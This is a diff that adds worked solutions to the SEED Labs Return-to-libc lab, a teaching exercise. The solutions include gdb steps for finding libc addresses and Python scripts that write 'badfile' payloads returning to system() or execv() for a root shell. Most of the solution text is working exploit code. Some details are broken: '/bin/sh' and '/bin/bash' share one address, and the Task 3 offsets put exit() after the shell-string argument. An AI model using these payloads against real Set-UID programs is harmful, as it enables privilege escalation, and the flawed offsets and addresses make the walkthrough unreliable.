+           // Print the address of the environment variable
+           printf("%x\n", (unsigned int)shell);
+       }
+   }
+   ```
+and make (makefile is updated)
+`make`
+
+4. Run the Program to Get the Address
+
+   Execute the compiled program `prtenv` to retrieve the memory address of the `MYSHELL` environment variable:
+
+   ```bash
+   ./prtenv
+   ```
+
+   The output will be the memory address of the `MYSHELL` environment variable, which contains the string `/bin/sh`. For example:
+
+   ```
+   bffff7c4
+   ```
+
+   This address (`0xbffff7c4` in this example) will be used as an argument to the `system()` function in the return-to-libc attack.
+
+After completing the above steps, you will have:
+1. The environment variable `MYSHELL` set to `/bin/sh`.
+2. The memory address of the `MYSHELL` environment variable printed by `prtenv`.
+
+For example:
+
+```
+MYSHELL=/bin/sh
+bffff7c4
+```
+
+This address will be used in the next task to perform the return-to-libc attack.
 
 #### 3.3 Task 3: Launching the Attack
 
@@ -281,7 +1148,7 @@ Y = 0
 system_addr = 0x00000000 # The address of system()
 content[Y:Y+4] = (system_addr).to_bytes(4,byteorder=’little’)
 Z = 0
-exit_addr = 0x00000000 # The addres.s of exit()
+exit_addr = 0x00000000 # The address of exit()
 content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder=’little’)
 SEED Labs – Return-to-libc Attack Lab 7
 
@@ -314,50 +1181,316 @@ the address of this function in badfile. Run your attack again, report and expla
 making sure that the length of the new file name is different. For example, you can change it to newretlib.
 Repeat the attack (without changing the content of badfile). Will your attack succeed or not? If it does
 not succeed, explain why.
+##### solution
+###### 1 Find the Address of `"/bin/sh"`
+1. Locate the string `"/bin/sh"` in the libc library:
+   ```gdb
+   find __libc_start_main,+9999999,"/bin/sh"
+   ```
+   Example output:
+   ```
+   0xf7f52a0b
+   ```
+   The address of `"/bin/sh"` is `0xf7f52a0b`.
 
-#### 3.4 Task 4: Defeat Shell’s countermeasure
+---
 
-The purpose of this task is to launch the return-to-libc attack after the shell’s countermeasure is enabled.
-Before doing Tasks 1 to 3, we relinked /bin/sh to /bin/zsh, instead of to /bin/dash (the original
-setting). This is because some shell programs, such as dash and bash, have a countermeasure that auto-
-matically drops privileges when they are executed in a Set-UID process. In this task, we would like to
-defeat such a countermeasure, i.e., we would like to get a root shell even though the /bin/sh still points
-to /bin/dash. Let us first change the symbolic link back:
-`$ sudo ln -sf /bin/dash /bin/sh`
-Although dash and bash both drop the Set-UID privilege, they will not do that if they are invoked
-with the -p option. When we return to the system function, this function invokes /bin/sh, but it does
-not use the -p option. Therefore, the Set-UID privilege of the target program will be dropped. If there
-is a function that allows us to directly execute "/bin/bash -p", without going through the system
-function, we can still get the root privilege.
-There are actually many libc functions that can do that, such as the exec() family of functions, includ-
-ing execl(), execle(), execv(), etc. Let’s take a look at the execv() function.
-`int execv(const char *pathname, char*const argv[]);`
-This function takes two arguments, one is the address to the command, the second is the address to the
-argument array for the command. For example, if we want to invoke "/bin/bash -p" using execv,
-we need to set up the following:
+###### Step 2: Determine the Offsets (X, Y, Z)
+The offsets `X`, `Y`, and `Z` depend on the layout of the stack and the structure of the payload. To determine these offsets:
 
+1. **Analyze the stack layout**:
+   - Use `gdb` to set a breakpoint at the vulnerable function (e.g., `bof()`).
+   - Run the program and inspect the stack to determine where the return address is located.
+
+2. **Trial and Error**:
+   - Start with a guess for `X`, `Y`, and `Z` based on the stack layout.
+   - Adjust the offsets until the payload overwrites the return address correctly.
+
+For this example, let's assume the following offsets:
+- `X = 112`: The offset where the address of `"/bin/sh"` is placed.
+- `Y = 108`: The offset where the address of `system()` is placed.
+- `Z = 116`: The offset where the address of `exit()` is placed.
+
+---
+
+###### Step 3: Update the Exploit Code
+Now that we have the addresses and offsets, we can update the exploit code:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Addresses
+sh_addr = 0xf7f52a0b       # The address of "/bin/sh"
+system_addr = 0xf7e12420   # The address of system()
+exit_addr = 0xf7e04f80     # The address of exit()
+
+# Offsets
+X = 112
+Y = 108
+Z = 116
+
+# Construct the payload
+content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
+content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
+content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+    f.write(content)
 ```
+
+---
+
+###### Step 4: Test the Exploit
+1. Run the vulnerable program with the crafted `badfile`:
+   ```bash
+   ./vulnerable_program < badfile
+   ```
+2. If the exploit is successful, you should get a shell.
+
+---
+
+##### Attack Variations
+
+###### Variation 1: Exclude `exit()`
+To test the attack without including the address of `exit()`, simply remove the `exit_addr` from the payload:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Addresses
+sh_addr = 0xf7f52a0b       # The address of "/bin/sh"
+system_addr = 0xf7e12420   # The address of system()
+
+# Offsets
+X = 112
+Y = 108
+
+# Construct the payload
+content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')
+content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+    f.write(content)
+```
+
+Run the attack again and observe the behavior. The program may crash after executing `system()` because there is no valid return address.
+
+---
+
+###### Variation 2: Change the File Name
+If you change the file name of the vulnerable program (e.g., from `retlib` to `newretlib`), the attack may fail. This is because the memory layout of the program (including the stack and libc addresses) may change due to differences in the length of the file name. To fix this, you would need to recalculate the addresses and offsets.
+
+---
+
+##### Explanation of Observations
+1. **Without `exit()`**: The attack may still succeed in executing `system("/bin/sh")`, but the program will likely crash afterward because there is no valid return address.
+2. **File Name Change**: The attack may fail because the memory layout changes, causing the addresses and offsets to become invalid. This demonstrates the importance of precise memory layout knowledge in return-to-libc attacks.
+
+
+#### 3.4 Task 4: Defeat Shell’s Countermeasure
+
+The goal of this task is to launch the return-to-libc attack after enabling the shell’s countermeasure. Before completing Tasks 1 to 3, we relinked `/bin/sh` to `/bin/zsh` instead of `/bin/dash` (the original setting). This is because some shell programs, such as `dash` and `bash`, have a countermeasure that automatically drops privileges when executed in a Set-UID process. In this task, we aim to bypass this countermeasure and obtain a root shell, even when `/bin/sh` points to `/bin/dash`.
+
+First, change the symbolic link back to `/bin/dash`:
+```bash
+$ sudo ln -sf /bin/dash /bin/sh
+```
+
+Although `dash` and `bash` drop the Set-UID privilege, they do not do so if invoked with the `-p` option. When the `system()` function is called, it invokes `/bin/sh` but does not use the `-p` option. As a result, the Set-UID privilege of the target program is dropped. However, if we can directly execute `/bin/bash -p` without going through the `system()` function, we can retain root privileges.
+
+Several libc functions, such as the `exec()` family (e.g., `execl()`, `execle()`, `execv()`, etc.), allow us to achieve this. For this task, we will use the `execv()` function:
+```c
+int execv(const char *pathname, char *const argv[]);
+```
+
+This function takes two arguments:
+1. `pathname`: The address of the command to execute.
+2. `argv[]`: The address of the argument array for the command.
+
+To invoke `/bin/bash -p` using `execv()`, we need to set up the following:
+```c
 pathname = address of "/bin/bash"
 argv[0] = address of "/bin/bash"
 argv[1] = address of "-p"
 argv[2] = NULL (i.e., 4 bytes of zero).
 ```
 
-From the previous tasks, we can easily get the address of the two involved strings. Therefore, if we can
-construct the argv[] array on the stack, get its address, we will have everything that we need to conduct
-the return-to-libc attack. This time, we will return to the execv() function.
-There is one catch here. The value of argv[2] must be zero (an integer zero, four bytes). If we put
-four zeros in our input, strcpy() will terminate at the first zero; whatever is after that will not be copied
-into the bof() function’s buffer. This seems to be a problem, but keep in mind, everything in your input is
-already on the stack; they are in the main() function’s buffer. It is not hard to get the address of this buffer.
-To simplify the task, we already let the vulnerable program print out that address for you.
-Just like in Task 3, you need to construct your input, so when the bof() function returns, it returns
-to execv(), which fetches from the stack the address of the "/bin/bash" string and the address of
-the argv[] array. You need to prepare everything on the stack, so when execv() gets executed, it can
-execute "/bin/bash -p" and give you the root shell. In your report, please describe how you construct
-your input.
+From previous tasks, we can easily obtain the addresses of the required strings. If we construct the `argv[]` array on the stack and get its address, we will have everything needed to conduct the return-to-libc attack. This time, we will return to the `execv()` function.
 
-#### 3.5 Task 5 (Optional): Return-Oriented Programming
+**Important Note**: The value of `argv[2]` must be zero (an integer zero, four bytes). If we include four zeros in our input, `strcpy()` will terminate at the first zero, and anything after it will not be copied into the `bof()` function’s buffer. However, since everything in our input is already on the stack (in the `main()` function’s buffer), we can use the address of this buffer to solve the problem. The vulnerable program conveniently prints this address for us.
+
+To complete this task, construct your input so that when the `bof()` function returns, it jumps to `execv()`, which fetches the address of the `/bin/bash` string and the `argv[]` array from the stack. When `execv()` executes, it will invoke `/bin/bash -p` and give you a root shell.
+
+---
+
+### Solution
+
+#### Step 1: Determine the Required Addresses
+
+1. **Address of `execv()`**
+   Use `gdb` to find the address of the `execv()` function in the libc library:
+   ```bash
+   gdb ./vulnerable_program
+   ```
+   In `gdb`, run:
+   ```gdb
+   p execv
+   ```
+   Example output:
+   ```
+   $1 = {<text variable, no debug info>} 0xf7e0f060 <execv>
+   ```
+   The address of `execv()` is `0xf7e0f060`.
+
+2. **Address of `/bin/bash`**
+   Use `gdb` to locate the string `/bin/bash` in the libc library:
+   ```gdb
+   find __libc_start_main,+9999999,"/bin/bash"
+   ```
+   Example output:
+   ```
+   0xf7f52a0b
+   ```
+   The address of `/bin/bash` is `0xf7f52a0b`.
+
+3. **Address of `-p`**
+   Similarly, locate the string `-p` in the libc library:
+   ```gdb
+   find __libc_start_main,+9999999,"-p"
+   ```
+   Example output:
+   ```
+   0xf7f52b0c
+   ```
+   The address of `-p` is `0xf7f52b0c`.
+
+4. **Address of the Stack Buffer**
+   The vulnerable program prints the address of the stack buffer. Run the program and note the printed address. For example:
+   ```
+   Buffer address: 0xffffd0a0
+   ```
+   The stack buffer starts at `0xffffd0a0`.
+
+---
+
+#### Step 2: Construct the Payload
+
+The payload must:
+1. Overwrite the return address to point to `execv()`.
+2. Place the arguments for `execv()` on the stack:
+   - `pathname`: Address of `/bin/bash`.
+   - `argv[]`: Address of the argument array on the stack.
+
+##### 2.1 Layout of the Payload
+The payload will look like this:
+```
+[ Padding ] [ execv() address ] [ Return address (dummy) ] [ pathname ] [ argv[] ]
+[ argv[0] ] [ argv[1] ] [ argv[2] ]
+```
+
+##### 2.2 Calculate Offsets
+Use `gdb` to determine the offset to the return address. For example, if the return address is at offset `112`, the payload will start with `112` bytes of padding.
+
+##### 2.3 Construct the Argument Array
+The `argv[]` array must be constructed on the stack:
+- `argv[0]`: Address of `/bin/bash` (`0xf7f52a0b`).
+- `argv[1]`: Address of `-p` (`0xf7f52b0c`).
+- `argv[2]`: `NULL` (4 bytes of zero).
+
+Assume the `argv[]` array is placed at `0xffffd0c0` (just after the padding).
+
+---
+
+#### Step 3: Write the Exploit Code
+
+Here is the Python script to generate the payload:
+
+```python
+#!/usr/bin/env python3
+import sys
+
+# Fill content with non-zero values
+content = bytearray(0xaa for i in range(300))
+
+# Addresses
+execv_addr = 0xf7e0f060       # Address of execv()
+bin_bash_addr = 0xf7f52a0b    # Address of "/bin/bash"
+dash_p_addr = 0xf7f52b0c      # Address of "-p"
+argv_addr = 0xffffd0c0        # Address of argv[] on the stack
+
+# Offsets
+padding_offset = 112          # Offset to the return address
+return_addr_offset = padding_offset + 4
+pathname_offset = return_addr_offset + 4
+argv_offset = pathname_offset + 4
+
+# Construct the payload
+# Padding
+content[:padding_offset] = b"A" * padding_offset
+
+# Overwrite return address with execv() address
+content[padding_offset:padding_offset+4] = (execv_addr).to_bytes(4, byteorder='little')
+
+# Dummy return address (not used, but required for stack alignment)
+content[return_addr_offset:return_addr_offset+4] = b"BBBB"
+
+# Argument 1: pathname (address of "/bin/bash")
+content[pathname_offset:pathname_offset+4] = (bin_bash_addr).to_bytes(4, byteorder='little')
+
+# Argument 2: argv[] (address of the argument array)
+content[argv_offset:argv_offset+4] = (argv_addr).to_bytes(4, byteorder='little')
+
+# Construct argv[] on the stack
+argv0_offset = argv_addr - 0xffffd0a0
+argv1_offset = argv0_offset + 4
+argv2_offset = argv1_offset + 4
+
+# argv[0]: Address of "/bin/bash"
+content[argv0_offset:argv0_offset+4] = (bin_bash_addr).to_bytes(4, byteorder='little')
+
+# argv[1]: Address of "-p"
+content[argv1_offset:argv1_offset+4] = (dash_p_addr).to_bytes(4, byteorder='little')
+
+# argv[2]: NULL (4 bytes of zero)
+content[argv2_offset:argv2_offset+4] = (0).to_bytes(4, byteorder='little')
+
+# Save content to a file
+with open("badfile", "wb") as f:
+    f.write(content)
+```
+
+---
+
+#### Step 4: Test the Exploit
+
+1. Run the vulnerable program with the crafted `badfile`:
+   ```bash
+   ./vulnerable_program < badfile
+   ```
+2. If the exploit is successful, you should get a root shell.
+
+---
+
+#### Explanation of the Exploit
+
+1. The payload overwrites the return address to point to `execv()`.
+2. The arguments for `execv()` are placed on the stack:
+   - `pathname` points to the string `/bin/bash`.
+   - `argv[]` is an array containing:
+     - `argv[0]`: Address of `/bin/bash`.
+     - `argv[1]`: Address of `-p`.
+     - `argv[2]`: `NULL`.
+3. When `execv()` is executed, it invokes `/bin/bash -p`, bypassing the privilege-dropping countermeasure and giving you a root shell.
 
 There are many ways to solve the problem in Task 4. Another way is to invoke setuid(0) before invoking
 system(). The setuid(0) call sets both real user ID and effective user ID to 0, turning the process
@@ -467,7 +1600,7 @@ SEED Labs – Return-to-libc Attack Lab 10
 Let us concentrate on the stack while calling foo(). We can ignore the stack before that. Please note that
 line numbers instead of instruction addresses are used in this explanation.
 
-![alt text](Return-to-libc/image.png)
+![alt text](image.png)
 
 Figure 1: Entering and Leaving foo()
 • Line 28-29:: These two statements push the value 1, i.e. the argument to the foo(), into the stack.
